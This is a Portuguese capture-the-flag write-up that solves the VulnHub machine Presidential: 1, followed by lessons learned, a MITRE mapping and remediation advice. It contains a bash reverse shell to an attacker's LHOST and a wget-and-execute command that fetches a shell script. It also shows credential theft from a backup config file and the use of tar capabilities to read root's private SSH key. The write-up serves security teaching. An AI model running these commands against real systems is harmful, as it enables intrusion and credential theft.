# Presidential: 1 — O Voto Foi Feito, o Root é Seu

Caramba, essa aqui é sensacional! Presidential: 1 te coloca no papel de pesquisador de segurança auditando uma infraestrutura web fictícia de eleição presidencial dos EUA. A máquina é legitimamente difícil: um arquivo de configuração de backup vaza credenciais do banco de dados, o phpMyAdmin expõe um hash que o John the Ripper quebra, uma cadeia LFI-para-RCE te dá shell, e aí uma capability Linux no `tar` (cap_dac_read_search) te permite ler a chave SSH privada do root. A jogada final: SSH como root. Limpa, em camadas, e cada passo tem um equivalente do mundo real encontrado em ambientes de produção reais.

Grande salve ao Syed Umar Arfeen por projetar uma máquina onde o tema melhora o realismo em vez de ser apenas decorativo.

| Campo | Valor |
|---|---|
| **Nível** | Difícil |
| **VM Alvo** | Presidential: 1 |
| **VM Atacante** | Kali Linux 2024.x |
| **URL VulnHub** | https://www.vulnhub.com/entry/presidential-1,504/ |
| **Técnicas** | Enumeração vhost, exposição de arquivo de backup, quebra de hash (John the Ripper), LFI/RCE phpMyAdmin, abuso de capabilities Linux (cap_dac_read_search no tar), extração de chave SSH privada |
| **CVEs** | CWE-200 (exposição de arquivo de config de backup), CWE-269 (má configuração de capabilities Linux), CWE-916 (hashing insuficiente de senha) |
| **Grupos APT** | APT29 (Cozy Bear, conhecido por atacar infraestrutura eleitoral e aplicações web governamentais); APT28 (Fancy Bear, usa descoberta de arquivos de backup e dumping de credenciais em intrusões em redes governamentais) |

---

## Resumo do Ataque

```
nmap → HTTP (80), HTTPS (443)
  → Browse http://alvo/ → e-mail no site → domínio: votenow.local
  → /etc/hosts: adicionar votenow.local
  → gobuster -x bak,php → config.php.bak → credenciais do BD
  → gobuster vhost → datasafe.votenow.local
  → /etc/hosts: adicionar datasafe.votenow.local
  → http://datasafe.votenow.local/phpmyadmin/ → login com creds do BD
  → hash de senha admin no BD → John the Ripper → quebrado
  → phpMyAdmin LFI → injeção em cookie de sessão → RCE PHP
  → reverse shell como apache/www-data
  → su admin (reutilização de senha) → user.txt
  → getcap -r / → /usr/bin/tar = cap_dac_read_search+ep
  → tar -cvf /tmp/id_rsa.tar /root/.ssh/id_rsa
  → tar -xvf /tmp/id_rsa.tar → ler chave privada
  → ssh -i root_id_rsa root@alvo → root
  → cat /root/root.txt
```

---

## Metodologia

1. Descoberta do host e scan completo de portas
2. Descoberta de nome de domínio a partir do conteúdo do site
3. Enumeração de arquivos: descobrir config.php.bak com credenciais do banco de dados
4. Enumeração de virtual host para encontrar subdomínio phpMyAdmin
5. Login no phpMyAdmin com credenciais do banco de dados
6. Quebra de hash com John the Ripper para senha admin
7. Exploração LFI/RCE phpMyAdmin para reverse shell
8. Estabilização do shell
9. Captura da flag de usuário via su admin (reutilização de senha)
10. Enumeração de capabilities Linux
11. cap_dac_read_search no tar: extrair chave SSH privada do root
12. Login SSH como root e captura da flag root

---

## Passo 1 — Descoberta do Host e Scan Completo

```bash
sudo netdiscover -i eth0
# Alvo: 192.168.10.172

nmap -A -p- 192.168.10.172
```

```
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.x
443/tcp open  https   Apache httpd 2.4.x
```

Ambas as portas servem conteúdo web. HTTP pode redirecionar para HTTPS. Começar navegando o site manualmente para coletar informações antes de executar ferramentas automatizadas.

---

## Passo 2 — Descoberta de Domínio e Configuração do /etc/hosts

Navegar para `http://192.168.10.172`. O site é uma página fictícia de eleição presidencial. Inspecionar o site em busca de endereços de e-mail, detalhes de contato, ou qualquer texto que revele o domínio:

```bash
curl -s http://192.168.10.172 | grep -i "@\|domain\|votenow"
```

Um endereço de e-mail na página revela o nome do domínio (ex.: `admin@votenow.local`). Adicionar ao `/etc/hosts`:

```bash
echo "192.168.10.172 votenow.local" >> /etc/hosts
```

---

## Passo 3 — Enumeração de Arquivos: Descoberta de Config de Backup

Executar gobuster com extensões de arquivo de backup:

```bash
gobuster dir \
    -u http://votenow.local/ \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt,bak,old,backup \
    -t 40 \
    -o /tmp/gobusting.txt
```

**Encontrado:** `config.php.bak` — um backup esquecido do arquivo de configuração da aplicação.

```bash
curl http://votenow.local/config.php.bak
```

```php
<?php
$dbHost = "localhost";
$dbUsername = "votebox";
$dbPassword = "casoj3$$swaaccepted";
$dbName = "votebox";
?>
```

Credenciais do banco de dados extraídas: `votebox` / `casoj3$$swaaccepted`.

**Nota do mundo real:** Arquivos de backup com extensões `.bak`, `.old`, `.php~` ou `.orig` estão entre os problemas mais consistentemente encontrados em testes de penetração de aplicações web. Desenvolvedores os criam durante manutenção e esquecem de deletar. APT28 especificamente busca arquivos de backup e configuração durante o reconhecimento inicial de infraestrutura web governamental.

---

## Passo 4 — Enumeração de Virtual Host

Enumerar virtual hosts para descobrir subdomínios:

```bash
gobuster vhost \
    -u http://votenow.local/ \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    --append-domain
```

**Encontrado:** `datasafe.votenow.local` — adicionar ao `/etc/hosts`:

```bash
echo "192.168.10.172 datasafe.votenow.local" >> /etc/hosts
```

Navegar para `http://datasafe.votenow.local/phpmyadmin/` — um painel phpMyAdmin carrega.

---

## Passo 5 — Login phpMyAdmin e Quebra de Hash

Fazer login no phpMyAdmin usando as credenciais do banco de dados do `config.php.bak`:

```
Usuário: votebox
Senha: casoj3$$swaaccepted
```

Navegar pelas tabelas do banco de dados. Encontrar a tabela de usuários `admin` contendo um hash de senha.

Salvar o hash:

```bash
echo 'admin:<valor_do_hash>' > /tmp/admin.hash
```

Quebrar com John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/admin.hash
john --show /tmp/admin.hash
```

Senha admin quebrada.

**Alternativa:** `hashcat -m 0 /tmp/admin.hash /usr/share/wordlists/rockyou.txt -d 1 -w 3` — usar o dispositivo NVIDIA CUDA para velocidade.

---

## Passo 6 — LFI/RCE phpMyAdmin e Reverse Shell

Fazer login no phpMyAdmin com as credenciais admin quebradas.

A versão do phpMyAdmin permite que um usuário autenticado alcance execução de código via injeção em arquivo de sessão e LFI:

1. Autenticar no phpMyAdmin como admin
2. Criar uma sessão PHP maliciosa injetando código PHP via query SQL elaborada ou manipulação de sessão
3. Incluir o arquivo de sessão via parâmetro LFI para executar o código PHP

Criar script shell no atacante:

```bash
cat > /tmp/shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/LHOST/4444 0>&1
EOF
chmod +x /tmp/shell.sh
```

Servir o arquivo:

```bash
python3 -m http.server 8080
```

Iniciar listener:

```bash
nc -lvnp 4444
```

Através do RCE phpMyAdmin, executar:

```bash
wget http://LHOST:8080/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

Reverse shell recebido. Estabilizar:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

Tentar mudar para admin usando a senha quebrada:

```bash
su admin
# Usar a senha quebrada
cat ~/user.txt
cat ~/notes.txt
```

---

## Passo 7 — Enumeração de Capabilities Linux

Enumerar todas as capabilities Linux definidas em binários:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/tar = cap_dac_read_search+ep
```

`cap_dac_read_search` permite que o binário ignore todas as verificações de permissão de leitura DAC (Controle de Acesso Discricionário). Combinado com `+ep` (efetivo e permitido), o `tar` pode ler qualquer arquivo no sistema de arquivos, incluindo arquivos pertencentes ao root sem permissão de leitura para outros.

**Nota do mundo real:** Capabilities Linux são uma alternativa mais granular ao SUID, mas são igualmente perigosas quando mal aplicadas. `cap_dac_read_search` num arquivador de arquivos é essencialmente um mecanismo para ler qualquer arquivo no sistema. Este achado aparece em instâncias de provedores de nuvem, nós Kubernetes e ambientes containerizados com scripts de inicialização mal configurados.

---

## Passo 8 — Extrair Chave SSH do Root via Capability do tar

Usar `tar` com `cap_dac_read_search` para ler a chave SSH privada do root:

```bash
# Arquivar o diretório .ssh do root (a capability ignora a verificação de permissão)
tar -cvf /tmp/id_rsa.tar /root/.ssh/id_rsa

# Descompactar em diretório gravável
cd /tmp && tar -xvf id_rsa.tar

# Ler a chave privada
cat /tmp/root/.ssh/id_rsa
```

Copiar o conteúdo da chave. Na máquina atacante:

```bash
vim /tmp/chave_root
# Colar o conteúdo da chave privada
chmod 600 /tmp/chave_root
```

---

## Passo 9 — Login SSH como Root e Captura da Flag

```bash
ssh -i /tmp/chave_root root@192.168.10.172
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. A eleição acabou, e você ganhou.

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial BD | votebox:(senha) | config.php.bak (web root) | Login phpMyAdmin |
| Hash Admin | (hash MD5) | Tabela do banco no phpMyAdmin | Quebra com John |
| Senha Admin | (quebrada) | John the Ripper rockyou | RCE phpMyAdmin + su admin |
| Chave SSH Root | Chave privada RSA | /root/.ssh/id_rsa via capability tar | Login SSH como root |
| Flag Usuário | user.txt | /home/admin/user.txt | Capturada após su admin |
| Flag Root | root.txt | /root/root.txt | Capturada após SSH como root |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Aprendizado Chave |
|---|---|---|---|
| 1 | config.php.bak no web root expõe credenciais do BD | Arquivos de backup em diretórios acessíveis pela web são um achado frequente em pentests | Adicionar *.bak, *.old, *.php~ às regras de negação do servidor web; automatizar limpeza de backup no CI/CD |
| 2 | phpMyAdmin exposto em subdomínio público | phpMyAdmin nunca deve ser publicamente acessível sem restrição de IP | Restringir phpMyAdmin ao localhost ou VPN; exigir MFA; usar lista de IPs permitidos |
| 3 | Hash de senha admin quebrado com rockyou | Senhas fracas armazenadas como MD5/SHA1 são imediatamente quebráveis | Usar bcrypt/argon2 para armazenamento de senhas; impor senhas fortes (12+ caracteres) |
| 4 | Reutilização de senha: senha BD reutilizada para conta do sistema | Comprometimento de uma credencial desbloqueou duas camadas de autenticação | Senhas únicas por serviço; implantar solução PAM; auditar reutilização |
| 5 | cap_dac_read_search no /usr/bin/tar ignora todas as permissões de arquivo | Capabilities Linux em arquivadores de arquivos concedem acesso de leitura a tudo | Auditar capabilities com getcap -r / após qualquer mudança no sistema; remover capabilities desnecessárias |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso | Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | Acesso | Força Bruta: Quebra de Senha | T1110.002 |
| Acesso a Credenciais | Acesso | Credenciais em Arquivos: Chaves Privadas | T1552.004 |
| Execução | Execução | Interpretador: Shell Unix | T1059.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Escalada de Privilégios | Escalada | Abuso de Mecanismo de Controle de Elevação | T1548 |
| Movimento Lateral | Lateral | Serviços Remotos: SSH | T1021.004 |
| Acesso Inicial | Acesso | Contas Válidas | T1078 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover config.php.bak do web root**: adicionar `*.bak` às regras de negação; automatizar limpeza de backup nos scripts de implantação
2. **Restringir acesso ao phpMyAdmin**: vincular apenas ao localhost; exigir VPN ou lista de IPs permitidos
3. **Usar hashing forte de senhas**: migrar de MD5/SHA1 para bcrypt ou argon2
4. **Impor senhas únicas**: sem reutilização entre banco de dados, sistema e contas de aplicação web
5. **Remover cap_dac_read_search do tar**: `setcap -r /usr/bin/tar`; auditar todas as capabilities Linux trimestralmente
6. **Desativar login SSH root**: `PermitRootLogin no` no sshd_config; usar apenas autenticação por chave

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar instâncias phpMyAdmin; auditar arquivos de backup acessíveis pela web |
| Proteger | Controle de Acesso | Restringir phpMyAdmin; desativar SSH root; lista de IPs permitidos |
| Proteger | Segurança de Dados | Remover arquivos de backup do web root; usar hashing forte de senhas |
| Detectar | Anomalias e Eventos | Alertar sobre tentativas de login no phpMyAdmin; monitorar abuso de capabilities |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais expostas; remover arquivos de backup; revogar chaves SSH comprometidas |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; auditar todas as capabilities Linux |

---

## Considerações Finais

Presidential: 1 é uma aula magistral de exposição de credenciais em camadas. Cada passo descasca outra camada da cebola: arquivo de backup, creds do BD, phpMyAdmin, hash, acesso ao sistema, capabilities, chave SSH root, root. Cada camada é um achado real em ambientes reais. Segurança eleitoral é um domínio criticamente importante, e o tema da máquina faz cada passo parecer significativo.

O ângulo das capabilities Linux merece atenção especial: `getcap -r /` não está no script de enumeração inicial de todo pentester, mas deveria estar. Depois de completar essa máquina, estará no seu.

Top demais, sem mentira. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
